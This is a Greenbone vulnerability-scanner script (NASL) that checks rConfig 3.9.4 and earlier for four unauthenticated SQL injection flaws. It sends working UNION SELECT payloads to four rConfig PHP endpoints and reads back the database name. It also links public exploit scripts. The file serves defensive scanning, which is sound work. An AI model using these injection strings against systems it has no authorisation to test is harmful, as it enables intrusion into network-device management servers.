# Copyright (C) 2020 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:rconfig:rconfig";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.144086");
  script_version("2020-06-08T09:32:44+0000");
  script_tag(name:"last_modification", value:"2020-06-08 12:34:35 +0000 (Mon, 08 Jun 2020)");
  script_tag(name:"creation_date", value:"2020-06-08 08:07:11 +0000 (Mon, 08 Jun 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2020-10546", "CVE-2020-10547", "CVE-2020-10548", "CVE-2020-10549");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("rConfig <= 3.9.4 Multiple SQL Injection Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_rconfig_detect.nasl");
  script_mandatory_keys("rconfig/detected");

  script_tag(name:"summary", value:"rConfig is prone to multiple SQL injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple HTTP GET requests and checks the responses.");

  script_tag(name:"insight", value:"rConfig is prone to multiple unauthenticated SQL injection vulnerabilities
  in compliancepolicies.inc.php, compliancepolicyelements.inc.php, devices.inc.php and snippets.inc.php.");

  script_tag(name:"affected", value:"rConfig version 3.9.4 and prior.");

  script_tag(name:"solution", value:"No known solution is available as of 08th June, 2020.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://github.com/theguly/exploits/blob/master/CVE-2020-10546.py");
  script_xref(name:"URL", value:"https://github.com/theguly/exploits/blob/master/CVE-2020-10547.py");
  script_xref(name:"URL", value:"https://github.com/theguly/exploits/blob/master/CVE-2020-10548.py");
  script_xref(name:"URL", value:"https://github.com/theguly/exploits/blob/master/CVE-2020-10549.py");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

urls = make_list("/compliancepolicies.inc.php?search=True&searchColumn=policyName&searchOption=contains&searchField=antani'+union+select+(select+concat(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)+limit+0,1),NULL,NULL+--+",
                 "/compliancepolicyelements.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)+limit+0,1),NULL,NULL,NULL,NULL+--+&searchColumn=elementName&searchOption=contains",
                 "/devices.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)+limit+0,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+&searchColumn=n.id&searchOption=contains",
                 "/snippets.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains");

foreach url (urls) {
  req = http_get(port: port, item: dir + url);
  res = http_keepalive_send_recv(port: port, data: req);

  if ("[PWN]" >< res) {
    dbname = eregmatch(pattern: "\[PWN\]([^[]+)\[PWN\]", string: res);
    if (isnull(dbname[1]))
      continue;

    report = 'It was possible to obtain the database name through an SQL injection at ' +
             http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResult:\n\n' + dbname[1];
    security_message(port: port, data: report);

    exit(0);
  }
}

exit(99);
